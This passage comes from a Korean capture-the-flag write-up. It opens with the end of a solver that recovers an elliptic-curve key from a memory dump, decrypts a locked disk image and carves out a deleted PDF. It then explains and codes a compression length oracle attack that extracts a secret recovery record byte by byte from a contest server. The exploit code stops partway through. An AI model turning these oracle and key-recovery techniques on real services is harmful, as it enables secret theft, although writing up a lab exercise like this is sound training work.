    if values[0] != b"KCHK2\0\0\0" or zlib.crc32(raw[:-4]) & 0xFFFFFFFF != values[-1]:
        raise ValueError("invalid session checkpoint")
    _, boundary, ma, mb, mula, adda, mulb, addb, low_a, low_b, high_a, high_b, _ = values
    if not 0 < boundary < 257 or ma < 17 or mb < 17:
        raise ValueError("invalid recovery checkpoint")
    return {
        "boundary": boundary,
        "moduli": (ma, mb),
        "coefficients": ((mula, adda), (mulb, addb)),
        "targets": ((low_a, low_b), (high_a, high_b)),
    }


def candidate_stats(candidates):
    unknown = [i for i, c in enumerate(candidates) if len(c) > 1]
    products = [1]
    for i in unknown:
        products.append(products[-1] * len(candidates[i]))
    split = min(
        range(1, len(unknown)), key=lambda cut: max(products[cut], products[-1] // products[cut])
    )
    return unknown, split, products[split], products[-1] // products[split]


def recover_scalar(candidates, Q, checkpoint, cache_path=None, artifact_identity=None):
    unknown = [i for i, c in enumerate(candidates) if len(c) > 1]
    known = sum(c[0] * (1 << i) for i, c in enumerate(candidates) if len(c) == 1) % ORDER
    G = ECC.construct(curve=CURVE, d=1).pointQ
    boundary = checkpoint["boundary"]
    left_i = [i for i in unknown if i < boundary]
    right_i = [i for i in unknown if i >= boundary]
    target = Q + (-(G * known))
    table = {}
    artifact_identity = artifact_identity or bytes(32)

    def adjusted(group, indices):
        targets = list(checkpoint["targets"][group])
        mods = checkpoint["moduli"]
        for i, c in enumerate(candidates):
            if len(c) == 1 and ((i < boundary) == (group == 0)):
                for k, (mul, add) in enumerate(checkpoint["coefficients"]):
                    targets[k] = (targets[k] - c[0] * ((i * mul + add) % mods[k])) % mods[k]
        return tuple(targets)

    def states(indices, group):
        if len(indices) < 2:
            raise ValueError("checkpoint group has too few uncertain digits")
        active, pivots = indices[:-2], indices[-2:]
        mods = checkpoint["moduli"]
        targets = adjusted(group, indices)
        choices = [candidates[i] for i in active]
        weights = [1 << i for i in active]
        digits = [0] * len(active)
        scalar = sum(c[0] * w for c, w in zip(choices, weights)) % ORDER
        point = G * scalar
        residues = [
            sum(
                c[0]
                * (
                    (i * checkpoint["coefficients"][k][0] + checkpoint["coefficients"][k][1])
                    % mods[k]
                )
                for i, c in zip(active, choices)
            )
            % mods[k]
            for k in range(2)
        ]
        steps = []
        residue_steps = []
        pivot_map = {}
        for a in candidates[pivots[0]]:
            for b in candidates[pivots[1]]:
                key = (
                    a
                    * (
                        (
                            pivots[0] * checkpoint["coefficients"][0][0]
                            + checkpoint["coefficients"][0][1]
                        )
                        % mods[0]
                    )
                    + b
                    * (
                        (
                            pivots[1] * checkpoint["coefficients"][0][0]
                            + checkpoint["coefficients"][0][1]
                        )
                        % mods[0]
                    )
                ) % mods[0]
                pivot_scalar = (a * (1 << pivots[0]) + b * (1 << pivots[1])) % ORDER
                pivot_map.setdefault(key, []).append((pivot_scalar, G * pivot_scalar))
        for index, choice, weight in zip(active, choices, weights):
            row = []
            residue_row = []
            for j, value in enumerate(choice):
                following = choice[j + 1] if j + 1 < len(choice) else choice[0]
                delta = (following - value) * weight
                row.append(G * (delta % ORDER))
                residue_row.append(
                    tuple(
                        (following - value)
                        * (
                            (
                                index * checkpoint["coefficients"][k][0]
                                + checkpoint["coefficients"][k][1]
                            )
                            % mods[k]
                        )
                        % mods[k]
                        for k in range(2)
                    )
                )
            steps.append(row)
            residue_steps.append(residue_row)
        while True:
            need = (targets[0] - residues[0]) % mods[0]
            for pivot_scalar, pivot_point in pivot_map.get(need, []):
                yield (scalar + pivot_scalar) % ORDER, point + pivot_point
            for j in range(len(active) - 1, -1, -1):
                old = digits[j]
                following = choices[j][old + 1] if old + 1 < len(choices[j]) else choices[j][0]
                scalar = (scalar + (following - choices[j][old]) * weights[j]) % ORDER
                point = point + steps[j][old]
                for k in range(2):
                    residues[k] = (residues[k] + residue_steps[j][old][k]) % mods[k]
                if old + 1 < len(choices[j]):
                    digits[j] = old + 1
                    break
                digits[j] = 0
            else:
                return

    left_total = 1
    right_total = 1
    for i in left_i[:-2]:
        left_total *= len(candidates[i])
    for i in right_i[:-2]:
        right_total *= len(candidates[i])
    fingerprint = hashlib.sha256(
        repr([(i, candidates[i]) for i in unknown]).encode() + repr(checkpoint).encode() + pkey(Q)
    ).digest()

    def checkpoint_valid(scalar):
        value = scalar
        digits = []
        for _ in range(257):
            digit = 0
            if value & 1:
                digit = value & 31
                if digit >= 16:
                    digit -= 32
                value -= digit
            digits.append(digit)
            value >>= 1
        sums = [[0, 0], [0, 0]]
        for i, digit in enumerate(digits):
            group = 0 if i < boundary else 1
            for k, (mul, add) in enumerate(checkpoint["coefficients"]):
                sums[group][k] = (
                    sums[group][k] + digit * ((i * mul + add) % checkpoint["moduli"][k])
                ) % checkpoint["moduli"][k]
        return tuple(map(tuple, sums)) == tuple(map(tuple, checkpoint["targets"]))

    cache = Path(cache_path) if cache_path else None
    if cache and cache.exists():
        try:
            with cache.open("rb") as stream:
                header = stream.read(CACHE_HEADER.size)
                if len(header) != CACHE_HEADER.size:
                    raise ValueError("truncated cache header")
                magic, cached_fingerprint, cached_identity, count, checksum = CACHE_HEADER.unpack(
                    header
                )
                if (
                    magic != CACHE_MAGIC
                    or cached_fingerprint != fingerprint
                    or cached_identity != artifact_identity
                ):
                    raise ValueError("cache identity mismatch")
                if cache.stat().st_size != CACHE_HEADER.size + count * CACHE_RECORD.size:
                    raise ValueError("cache length mismatch")
                if file_sha(cache, CACHE_HEADER.size) != checksum:
                    raise ValueError("cache checksum mismatch")
                for _ in range(count):
                    key, encoded_scalar = CACHE_RECORD.unpack(stream.read(CACHE_RECORD.size))
                    scalar = int.from_bytes(encoded_scalar, "little")
                    if scalar >= ORDER or key in table:
                        raise ValueError("invalid cache record")
                    table[key] = scalar
            if table:
                print(f"[mitm] loaded {len(table):,} left states from {cache}", flush=True)
        except (OSError, ValueError, struct.error):
            table = {}
    if not table:
        started = time.monotonic()
        for count, (scalar, point) in enumerate(states(left_i, 0), 1):
            table.setdefault(pkey(point), scalar)
            if count % 100000 == 0:
                print(
                    f"[mitm] left {count:,}/{left_total:,} ({time.monotonic()-started:.0f}s)",
                    flush=True,
                )
        if cache:
            cache.parent.mkdir(parents=True, exist_ok=True)
            temporary = cache.with_suffix(cache.suffix + ".tmp")
            with temporary.open("wb") as stream:
                stream.write(
                    CACHE_HEADER.pack(
                        CACHE_MAGIC, fingerprint, artifact_identity, len(table), bytes(32)
                    )
                )
                for key, scalar in table.items():
                    stream.write(CACHE_RECORD.pack(key, scalar.to_bytes(32, "little")))
            checksum = file_sha(temporary, CACHE_HEADER.size)
            with temporary.open("r+b") as stream:
                stream.write(
                    CACHE_HEADER.pack(
                        CACHE_MAGIC, fingerprint, artifact_identity, len(table), checksum
                    )
                )
            temporary.replace(cache)
            print(f"[mitm] cached {len(table):,} left states at {cache}", flush=True)
    started = time.monotonic()
    for count, (right, right_point) in enumerate(states(right_i, 1), 1):
        if count % 100000 == 0:
            print(
                f"[mitm] right {count:,}/{right_total:,} ({time.monotonic()-started:.0f}s)",
                flush=True,
            )
        need = target + (-right_point)
        left = table.get(pkey(need))
        if left is not None:
            scalar = (known + left + right) % ORDER
            if pkey(G * scalar) == pkey(Q) and checkpoint_valid(scalar):
                return scalar, len(unknown), len(table), left_total, right_total
    raise ValueError("wNAF residue has no scalar satisfying Q=eG")


def decrypt_volume(body, fields, master, context, file_token, volume, ephemeral):
    mkey = hkdf(master, volume, b"manifest-v3")
    cipher = AES.new(mkey, AES.MODE_GCM, nonce=fields[T["manifest_nonce"]])
    cipher.update(struct.pack("<QQ", context, file_token) + ephemeral)
    manifest = cipher.decrypt_and_verify(fields[T["manifest"]], fields[T["manifest_tag"]])
    if manifest[:5] != b"KMAP4":
        raise ValueError("bad manifest")
    count, total = struct.unpack_from("<II", manifest, 5)
    transaction_id = manifest[13:29]
    expected_generation_sum = struct.unpack_from("<I", manifest, 29)[0]
    region_size = struct.unpack("<I", fields[T["region"]])[0]
    if (
        not count
        or not total
        or not region_size
        or len(manifest) != 33 + count * MREC.size
        or count != (total + region_size - 1) // region_size
        or len(body) != total
    ):
        raise ValueError("invalid manifest geometry")
    output = bytearray(total)
    cursor = 33
    generation_sum = 0
    slots = set()
    logicals = set()
    physical_ranges = []
    for _ in range(count):
        slot, logical, generation, length, physical, tag = MREC.unpack_from(manifest, cursor)
        cursor += MREC.size
        expected_length = min(region_size, total - logical * region_size)
        if (
            slot >= count
            or logical >= count
            or slot in slots
            or logical in logicals
            or length != expected_length
            or physical + length > len(body)
        ):
            raise ValueError("invalid manifest record")
        slots.add(slot)
        logicals.add(logical)
        physical_ranges.append((physical, physical + length))
        generation_sum = (generation_sum + generation) & 0xFFFFFFFF
        key = hkdf(master, volume, b"region-v3" + struct.pack("<II", logical, generation))
        nonce = hashlib.blake2s(
            volume + struct.pack("<II", logical, generation), person=b"KPSKreg"
        ).digest()[:12]
        aad = struct.pack("<QQIII", context, file_token, logical, generation, length)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        cipher.update(aad)
        chunk = cipher.decrypt_and_verify(body[physical : physical + length], tag)
        output[logical * region_size : logical * region_size + length] = chunk
    physical_cursor = 0
    for start, end in sorted(physical_ranges):
        if start != physical_cursor:
            raise ValueError("manifest physical coverage mismatch")
        physical_cursor = end
    if physical_cursor != total:
        raise ValueError("manifest physical coverage mismatch")
    if generation_sum != expected_generation_sum:
        raise ValueError("manifest generation checkpoint mismatch")
    return bytes(output), transaction_id


def validate_vhd(volume):
    if len(volume) < 4096 or len(volume) % 512:
        raise ValueError("invalid VHD length")
    disk_size = len(volume) - 512
    vhd = bytearray(volume[-512:])
    if (
        vhd[:8] != b"conectix"
        or struct.unpack_from(">Q", vhd, 40)[0] != disk_size
        or struct.unpack_from(">Q", vhd, 48)[0] != disk_size
        or struct.unpack_from(">I", vhd, 60)[0] != 2
    ):
        raise ValueError("invalid fixed VHD footer")
    expected = struct.unpack_from(">I", vhd, 64)[0]
    vhd[64:68] = b"\0" * 4
    if (~sum(vhd)) & 0xFFFFFFFF != expected:
        raise ValueError("VHD footer checksum mismatch")
    if volume[510:512] != b"\x55\xaa":
        raise ValueError("invalid MBR signature")
    part = struct.unpack_from("<I", volume, 454)[0]
    sectors = struct.unpack_from("<I", volume, 458)[0]
    if part < 1 or (part + sectors) * 512 != disk_size:
        raise ValueError("invalid partition boundary")
    boot = part * 512
    if (
        volume[boot + 510 : boot + 512] != b"\x55\xaa"
        or volume[boot + 54 : boot + 62] != b"FAT16   "
    ):
        raise ValueError("invalid FAT16 boot sector")
    bps = struct.unpack_from("<H", volume, boot + 11)[0]
    spc = volume[boot + 13]
    reserved = struct.unpack_from("<H", volume, boot + 14)[0]
    fats = volume[boot + 16]
    spf = struct.unpack_from("<H", volume, boot + 22)[0]
    if bps != 512 or not spc or spc & (spc - 1) or fats != 2 or not reserved or not spf:
        raise ValueError("invalid FAT16 geometry")
    fat_start = boot + reserved * bps
    fat_size = spf * bps
    if (
        volume[fat_start : fat_start + fat_size]
        != volume[fat_start + fat_size : fat_start + 2 * fat_size]
    ):
        raise ValueError("FAT copies disagree")


def recover_flag(volume, volume_id, ephemeral, manifest_transaction):
    validate_vhd(volume)
    part = struct.unpack_from("<I", volume, 454)[0]
    boot = part * 512
    bps = struct.unpack_from("<H", volume, boot + 11)[0]
    spc = volume[boot + 13]
    reserved = struct.unpack_from("<H", volume, boot + 14)[0]
    fats = volume[boot + 16]
    roots = struct.unpack_from("<H", volume, boot + 17)[0]
    spf = struct.unpack_from("<H", volume, boot + 22)[0]
    root_secs = (roots * 32 + bps - 1) // bps
    fat_start = boot + reserved * bps
    root_start = fat_start + fats * spf * bps
    data_start = root_start + root_secs * bps
    csize = bps * spc
    fat = volume[fat_start : fat_start + spf * bps]
    deleted = None
    journal_entry = None
    for off in range(root_start, root_start + roots * 32, 32):
        e = volume[off : off + 32]
        if e[0] == 0:
            break
        if e[0] == 0xE5 and e[8:11] == b"PDF":
            deleted = e
        if e[:8] == b"SYSJRN~1" and e[8:11] == b"BIN":
            journal_entry = e
    if deleted is None or journal_entry is None:
        raise ValueError("filesystem evidence missing")

    def chain(entry):
        cluster = struct.unpack_from("<H", entry, 26)[0]
        size = struct.unpack_from("<I", entry, 28)[0]
        out = bytearray()
        while 2 <= cluster < 0xFFF8 and len(out) < size:
            off = data_start + (cluster - 2) * csize
            out += volume[off : off + csize]
            cluster = struct.unpack_from("<H", fat, cluster * 2)[0]
        return bytes(out[:size])

    journal = chain(journal_entry)
    if len(journal) < JHEADER.size:
        raise ValueError("truncated journal")
    magic, record_size, commit_size, number, commit_count, transaction_id = JHEADER.unpack_from(
        journal
    )
    if magic != b"KJNL5\0\0\0" or record_size != JREC.size or commit_size != JCOMMIT.size:
        raise ValueError("bad journal header")
    if transaction_id != manifest_transaction:
        raise ValueError("manifest and journal transaction mismatch")
    if (
        number > 4096
        or commit_count > 256
        or JHEADER.size + number * record_size + commit_count * commit_size > len(journal)
    ):
        raise ValueError("invalid journal bounds")
    file_id = struct.unpack_from("<Q", deleted, 12)[0]
    size = struct.unpack_from("<I", deleted, 28)[0]
    all_records = []
    cursor = JHEADER.size
    for i in range(number):
        all_records.append(
            (journal[cursor : cursor + JREC.size], JREC.unpack_from(journal, cursor))
        )
        cursor += JREC.size
    commits = [JCOMMIT.unpack_from(journal, cursor + i * JCOMMIT.size) for i in range(commit_count)]
    valid = []
    for fid, revision, digest in commits:
        if fid != file_id:
            continue
        records = [
            (raw, rec) for raw, rec in all_records if rec[0] == file_id and rec[1] == revision
        ]
        records.sort(key=lambda item: item[1][2])
        previous = 0
        chain_ok = True
        if (
            not records
            or records[0][1][3] != len(records)
            or [rec[2] for _, rec in records] != list(range(len(records)))
            or any(rec[3] != len(records) for _, rec in records)
        ):
            continue
        for raw, rec in records:
            if rec[6] != previous:
                chain_ok = False
                break
            previous = int.from_bytes(hashlib.sha256(raw).digest()[:8], "little")
        if chain_ok and hashlib.sha256(b"".join(raw for raw, _ in records)).digest() == digest:
            valid.append((revision, [rec for _, rec in records]))
    if not valid:
        raise ValueError("no committed journal revision")
    revision, fragments = max(valid, key=lambda item: item[0])
    document = bytearray()
    for fid, rev, seq, total, cluster, crc, previous in fragments:
        take = min(csize, size - len(document))
        chunk = volume[
            data_start + (cluster - 2) * csize : data_start + (cluster - 2) * csize + take
        ]
        if zlib.crc32(chunk) & 0xFFFFFFFF != crc:
            raise ValueError("journal fragment CRC mismatch")
        document += chunk
    if len(document) != size:
        raise ValueError("incomplete deleted document")
    first_eof = document.find(b"%%EOF\n")
    if first_eof < 0:
        raise ValueError("base PDF revision missing")
    base = bytes(document[: first_eof + 6])
    recovery_object = document.find(b"/Type /RecordsRecovery", first_eof)
    if recovery_object < 0:
        raise ValueError("incremental recovery object missing")
    stream_at = document.find(b"stream\n", recovery_object)
    stream_end = document.find(b"\nendstream", stream_at)
    if stream_at < 0 or stream_end < 0:
        raise ValueError("recovery object stream missing")
    encoded = bytes(document[stream_at + 7 : stream_end]).strip().rstrip(b">")
    try:
        receipt = bytes.fromhex(encoded.decode())
    except (ValueError, UnicodeDecodeError):
        raise ValueError("invalid recovery object encoding")
    if len(receipt) < 56 or receipt[:6] != b"KRCPT3":
        raise ValueError("bad recovery receipt")
    doc_id = receipt[6:22]
    expected = receipt[22:54]
    length = struct.unpack_from("<H", receipt, 54)[0]
    sealed = receipt[56 : 56 + length]
    if len(receipt) != 56 + length:
        raise ValueError("invalid recovery receipt length")
    if int.from_bytes(doc_id[:8], "little") != file_id:
        raise ValueError("FAT and receipt document id mismatch")
    if hashlib.sha256(base).digest() != expected:
        raise ValueError("document receipt mismatch")
    mask = hashlib.shake_256(base + volume_id + ephemeral + doc_id + b"receipt-v3").digest(length)
    flag = bytes(a ^ b for a, b in zip(sealed, mask)).decode()
    if not flag.startswith("SHA{") or not flag.endswith("}"):
        raise ValueError("invalid flag receipt")
    return flag, len(fragments), bytes(document)


def solve(a):
    locked = Path(a.locked).read_bytes()
    body, fields = footer(locked)
    if len(fields[T["body_size"]]) != 8 or struct.unpack("<Q", fields[T["body_size"]])[0] != len(
        body
    ):
        raise ValueError("footer body size mismatch")
    context = struct.unpack("<Q", fields[T["context"]])[0]
    file_token = struct.unpack("<Q", fields[T["file"]])[0]
    volume_id = fields[T["volume"]]
    ephemeral = fields[T["ephemeral"]]
    Q = point(ephemeral)
    dump = Dump(a.memory)
    try:
        record_offset, provider, residue, reliability, state = record_and_pages(
            dump, context, file_token, volume_id
        )
        provider_fragments = validate_provider_fragments(dump, provider)
        checkpoint = recovery_checkpoint(dump, context, file_token, volume_id)
    finally:
        dump.close()
    candidates, suspicious = decode_digits(residue, reliability, context, file_token, volume_id)
    artifact_identity = hashlib.sha256(residue + reliability + pkey(Q)).digest()
    scalar, uncertain, left_states, left_total, right_total = recover_scalar(
        candidates, Q, checkpoint, a.mitm_cache, artifact_identity
    )
    A = point(fields[T["operator"]])
    shared = A * scalar
    kek = hkdf(
        int(shared.x).to_bytes(32, "big"),
        volume_id,
        b"envelope-v3" + struct.pack("<QQ", context, file_token),
    )
    master = AES.new(kek, AES.MODE_KWP).unseal(fields[T["wrap"]])
    plain, manifest_transaction = decrypt_volume(
        body, fields, master, context, file_token, volume_id, ephemeral
    )
    flag, fragments, document = recover_flag(plain, volume_id, ephemeral, manifest_transaction)
    doc_size = len(document)
    out = Path(a.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(plain)
    if a.pdf_output:
        pdf = Path(a.pdf_output)
        pdf.parent.mkdir(parents=True, exist_ok=True)
        pdf.write_bytes(document)
    regions = (len(plain) + 0xFFFFF) // 0x100000
    print(
        f"[1] context record   : 0x{record_offset:x}\n[2] provider address : 0x{provider:016x}\n[3] provider fragments: {provider_fragments}\n[4] suspicious digits: {suspicious}\n[5] corrected digits : {uncertain}\n[6] checkpoint search: {left_total:,} / {right_total:,}\n[7] MITM left states : {left_states}\n[8] scalar verified  : Q = eG\n[9] envelope unwrap  : valid\n[10] regions verified: {regions}\n[11] file fragments  : {fragments} ({doc_size} bytes)\n[12] output SHA-256  : {hashlib.sha256(plain).hexdigest()}\n[13] flag            : {flag}\n[+] wrote {out}"
    )
    if a.pdf_output:
        print(f"[+] wrote {pdf}")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--memory", required=True)
    p.add_argument("--locked", required=True)
    p.add_argument("--output")
    p.add_argument("--pdf-output")
    p.add_argument("--mitm-cache")
    a = p.parse_args()
    if not a.output:
        p.error("--output is required")
    solve(a)


if __name__ == "__main__":
    main()
```
### 2.9 나를 쫓아낸 회사의 진짜 복구 기록을 가져오세요

| 항목 | 내용 |
|---|---|
| 의뢰인 | `EX-DIRECTOR_11` |
| 분야 | Web |
| 난이도 | 하 |
| 제공 파일 | `Vault-Boundary-player.zip` |
| 핵심 원리 | 균형 epoch로 패딩을 상쇄하는 압축 길이 오라클 |
| 목표 | 압축 후 버킷 크기만 보이는 백업에서 실제 `recovery` 레코드 복구 |
| 플래그 | `SHA{a1b2c3d4e5f6-90d2}` |

![대회 플랫폼의 전자 금고 복구 기록 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-vault-boundary-challenge.png)

*그림 15. 전자 금고 복구 기록 의뢰 화면.*
{: .text-center }

이 의뢰는 손님 계정의 공유 메모를 관리자 백업에 섞어 넣고, 압축된 결과의 길이만 관찰해 실제 `recovery` 레코드를 복구하는 길이 오라클 문제입니다.

백업 본문은 압축 후 AES-GCM으로 암호화되며 참가자에게는 16바이트 버킷 단위의 크기만 보입니다. 레코드 배치와 패딩 순서는 요청 카운터, 스타일, 팀과 epoch에 따라 바뀌고 여러 미끼 레코드도 함께 존재합니다.

#### 1. WASM 관측 표본 분석

`schema.wasm`의 `public`과 `samples` custom section을 읽으면 공개 플래그 형식과 64개의 관측 표본을 얻을 수 있습니다. 표본 크기 차이의 최대공약수로 보고 크기 버킷이 16바이트임을 확인하고, 연속 요청을 비교해 16회가 하나의 균형 epoch를 이룬다는 사실을 찾습니다.

`public` section에는 사용할 수 있는 문자, payload 길이, CRC 식별자와 플래그 형식만 들어 있습니다. 실제 recovery 값이나 서버 패딩 비밀값은 포함하지 않습니다. `samples`에는 같은 알려진 note를 보낸 64개 `(counter, seed, style, filler, size)` 관측만 들어 있으므로, 참가자가 직접 주기와 layout 규칙을 추론해야 합니다.

#### 2. `layoutgen` 역공학

심볼이 제거된 `layoutgen`을 분석하면 요청 카운터, seed와 style에서 네 가지 배치 유형을 선택하는 방식을 복구할 수 있습니다. 이 중 실제 recovery 레코드와 참가자의 probe를 같은 압축 문맥에 두는 canonical layout과 cover를 선택합니다.

네 배치 유형은 xorshift, avalanche, rotate-xorshift와 rotate-avalanche 계열입니다. 배포 ELF는 고정 self-test만 수행하고 입력을 받아 결과를 계산해 주지 않으므로, 분석한 전이를 별도로 구현해야 합니다. 64개 표본을 모두 재현하는 조합을 찾으면 canonical layout 2와 cover 0을 얻을 수 있습니다.

#### 3. 균형 epoch로 패딩 상쇄

개별 응답 크기는 패딩 순서 때문에 그대로 비교할 수 없습니다. 요청 카운터를 16회 epoch 경계에 맞추고 같은 후보를 한 epoch 동안 측정합니다. 표본에서 확인한 균형성 때문에 16개 결과의 합은 팀별 패딩의 배치 순서와 무관하게 안정적으로 비교할 수 있습니다.

```python
def measure_candidate(prefix, candidate):
    probe = "recovery=" + prefix + candidate
    sizes = measure_one_balanced_epoch(probe)  # 16회
    return sum(sizes)
```

#### 4. 한 글자씩 recovery 복구

알고 있는 접두사 `recovery=SHA{` 뒤에 후보 문자를 붙여 공유 메모를 만듭니다. 후보마다 16회 측정값을 합산하면 개별 요청의 팀별 패딩은 상쇄되고, 실제 recovery와 더 길게 일치하는 후보의 합이 가장 작아집니다.

이 과정을 반복해 12자리 payload를 복구한 뒤 CRC16-CCITT를 계산합니다. 전체 플래그를 다시 probe로 보내 길이 오라클에서 최종 일치를 확인합니다. 여러 내부 측정은 배치 API로 묶어 네트워크 요청 수를 줄였으며, 개인 Access Token으로 확인한 `team_id`를 기준으로 요청 카운터와 측정 예산을 분리했습니다.

```text
알려진 접두사 : SHA{
복구 payload  : a1b2c3d4e5f6
CRC16-CCITT   : 90d2
```

공식 풀이에는 6,928회의 내부 측정이 필요하지만 16개 epoch를 배치 API 한 번에 묶어 실제 HTTP 요청은 약 28회로 줄였습니다. 측정 예산은 HTTP 요청 수가 아니라 배치 내부의 실제 측정 횟수를 기준으로 차감했습니다.

```text
SHA{a1b2c3d4e5f6-90d2}
```

#### 5. 익스플로잇

```python
from __future__ import annotations

import binascii
import json
import math
import os
import struct
import urllib.request
import urllib.error
import time
from pathlib import Path
from typing import Protocol

ROOT = Path(__file__).resolve().parents[2]
DEFAULT_HANDOUT = ROOT.parent / "for_user"
SERVER_URL = os.environ.get("SERVER_URL", "http://web.roomescapectf2026.site:40569")
TEAM_TOKEN = os.environ.get("TEAM_TOKEN", "")
STYLE = 0
CONSTANTS = [0x6D2B79F5, 0xA511E9B3, 0x9E3779B9, 0xC0DEC0DE]


def xorshift32(value: int) -> int:
    value &= 0xFFFFFFFF
    value ^= (value << 13) & 0xFFFFFFFF
    value ^= value >> 17
    value ^= (value << 5) & 0xFFFFFFFF
    return value & 0xFFFFFFFF


def rotl32(value: int, amount: int) -> int:
    value &= 0xFFFFFFFF
    amount &= 31
    if amount == 0:
        return value
    return ((value << amount) | (value >> (32 - amount))) & 0xFFFFFFFF


def avalanche32(value: int) -> int:
    value &= 0xFFFFFFFF
    value ^= value >> 16
    value = (value * 0x7FEB352D) & 0xFFFFFFFF
    value ^= value >> 15
    value = (value * 0x846CA68B) & 0xFFFFFFFF
    value ^= value >> 16
    return value & 0xFFFFFFFF


def layout_state(counter: int, seed: int, style: int) -> tuple[int, int]:
    if not 0 <= style < len(CONSTANTS):
        raise ValueError("invalid style")
    family = (style + ((counter >> 4) & 3)) & 3
    model_seed = seed >> 5
    if family == 0:
        state = xorshift32(model_seed ^ ((counter * 0x9E3779B9) & 0xFFFFFFFF) ^ CONSTANTS[style])
    elif family == 1:
        state = avalanche32(
            ((model_seed + counter * 0x85EBCA6B) & 0xFFFFFFFF) ^ CONSTANTS[style] ^ 0xB5297A4D
        )
    elif family == 2:
        state = xorshift32(
            (rotl32(model_seed ^ CONSTANTS[style], counter) + counter * 0xC2B2AE35 + 0x27D4EB2F)
            & 0xFFFFFFFF
        )
    else:
        state = avalanche32(
            rotl32((model_seed + CONSTANTS[style]) & 0xFFFFFFFF, counter >> 3)
            ^ ((counter * 0x165667B1) & 0xFFFFFFFF)
            ^ 0xD3A2646C
        )
    packed = (state ^ seed) & 31
    return packed & 3, (packed >> 2) & 7


def handout_dir() -> Path:
    configured = os.environ.get("VAULT_HANDOUT_DIR")
    return Path(configured).resolve() if configured else DEFAULT_HANDOUT


def load_public_schema() -> dict[str, object]:
    data = (handout_dir() / "schema.wasm").read_bytes()
    if len(data) < 8 or data[:8] != b"\x00asm\x01\x00\x00\x00":
        raise RuntimeError("올바른 WebAssembly 모듈이 아닙니다.")
    offset = 8

    def decode_u32(start: int) -> tuple[int, int]:
        value = 0
        shift = 0
        while True:
            if start >= len(data) or shift >= 35:
                raise RuntimeError("잘못된 WebAssembly LEB128입니다.")
            byte = data[start]
            start += 1
            value |= (byte & 0x7F) << shift
            if not byte & 0x80:
                return value, start
            shift += 7

    custom_sections: dict[bytes, bytes] = {}
    while offset < len(data):
        section_id = data[offset]
        section_size, body_start = decode_u32(offset + 1)
        body_end = body_start + section_size
        if body_end > len(data):
            raise RuntimeError("잘린 WebAssembly section입니다.")
        if section_id == 0:
            name_size, payload_start = decode_u32(body_start)
            name_end = payload_start + name_size
            if name_end > body_end:
                raise RuntimeError("잘린 WebAssembly custom section입니다.")
            custom_sections[data[payload_start:name_end]] = data[name_end:body_end]
        offset = body_end

    public = custom_sections.get(b"public", b"")
    samples = custom_sections.get(b"samples", b"")
    if len(public) < 8 or public[:4] != b"VBM1":
        raise RuntimeError("public schema evidence가 없습니다.")
    payload_length, alphabet_length, crc_id, format_length = public[4:8]
    expected_public = 8 + alphabet_length + format_length
    if len(public) != expected_public or crc_id != 1:
        raise RuntimeError("public schema evidence가 손상되었습니다.")
    alphabet = public[8 : 8 + alphabet_length].decode("ascii")
    flag_format = public[8 + alphabet_length :].decode("ascii")

    if len(samples) < 8 or samples[:4] != b"VBS1":
        raise RuntimeError("calibration evidence가 없습니다.")
    note_length, sample_count = struct.unpack_from("<HH", samples, 4)
    sample_start = 8 + note_length
    if len(samples) != sample_start + sample_count * 12:
        raise RuntimeError("calibration evidence가 손상되었습니다.")
    note = samples[8:sample_start].decode("utf-8")
    observations = []
    for index in range(sample_count):
        counter, seed, style, filler, size = struct.unpack_from(
            "<IIBBH", samples, sample_start + index * 12
        )
        observations.append(
            {
                "counter": counter,
                "seed": seed,
                "style": style,
                "filler": filler,
                "size": size,
            }
        )
    return {
        "format": flag_format,
        "payload_alphabet": alphabet,
        "payload_length": payload_length,
        "crc": "CRC-16/CCITT-FALSE over payload ASCII",
        "calibration": {"note": note, "observations": observations},
    }


def infer_oracle_parameters(schema: dict[str, object]) -> tuple[int, int, int]:
    calibration = schema.get("calibration")
    if not isinstance(calibration, dict):
        raise RuntimeError("calibration evidence가 없습니다.")
    observations = calibration.get("observations")
    if not isinstance(observations, list) or len(observations) < 32:
        raise RuntimeError("calibration 표본이 부족합니다.")
    counters = [int(item["counter"]) for item in observations]
    if counters != list(range(counters[0], counters[0] + len(counters))):
        raise RuntimeError("calibration counter가 연속적이지 않습니다.")
    sizes = [int(item["size"]) for item in observations]
    bucket = math.gcd(*sizes)
    if bucket <= 1:
        raise RuntimeError("reported-size bucket을 추론하지 못했습니다.")

    stable_periods = []
    for period in range(2, len(sizes) // 2 + 1):
        if len(sizes) % period:
            continue
        totals = [sum(sizes[start : start + period]) for start in range(0, len(sizes), period)]
        if len(totals) >= 3 and len(set(totals)) == 1:
            stable_periods.append(period)
    if bucket not in stable_periods:
        raise RuntimeError("balanced-noise epoch을 추론하지 못했습니다.")
    epoch_size = bucket

    states = {
        layout_state(int(item["counter"]), int(item["seed"]), int(item["style"]))
        for item in observations
    }
    if len(states) != 1:
        raise RuntimeError("calibration layout이 일관되지 않습니다.")
    layout, cover = states.pop()
    if cover != 0:
        raise RuntimeError("calibration cover가 안정적이지 않습니다.")
    return layout, bucket, epoch_size


def safe_seed(counter: int, layout: int) -> int:
    for seed in range(4096):
        actual_layout, cover = layout_state(counter, seed, STYLE)
        if actual_layout == layout and cover == 0:
            return seed
    raise RuntimeError("적절한 seed를 찾지 못했습니다.")


class Transport(Protocol):
    counter: int
    requests: int

    def share(self, value: str) -> None: ...

    def export(self, seed: int, style: int, filler: int) -> int: ...


class HttpTransport:
    def __init__(self):
        if not TEAM_TOKEN:
            raise RuntimeError("TEAM_TOKEN 환경 변수가 필요합니다.")
        status = self._post("/api/session", {})
        self.session = str(status["session"])
        self.counter = int(status["counter"])
        self.requests = 0

    def _post(self, path: str, body: dict[str, object]) -> dict[str, object]:
        headers = {"Content-Type": "application/json"}
        if path == "/api/session":
            headers["X-Team-Token"] = TEAM_TOKEN
        else:
            headers["X-Team-Session"] = self.session
        last_error: Exception | None = None
        for attempt in range(5):
            request = urllib.request.Request(
                SERVER_URL.rstrip("/") + path,
                data=json.dumps(body).encode(),
                headers=headers,
                method="POST",
            )
            try:
                with urllib.request.urlopen(request, timeout=30) as response:
                    return json.loads(response.read().decode())
            except urllib.error.HTTPError as error:
                last_error = error
                if error.code not in {408, 429, 500, 502, 503, 504}:
                    raise
            except (urllib.error.URLError, ConnectionError, TimeoutError) as error:
                last_error = error
            time.sleep(0.25 * (2**attempt))
        raise RuntimeError(f"서버 요청 재시도 실패: {last_error}")

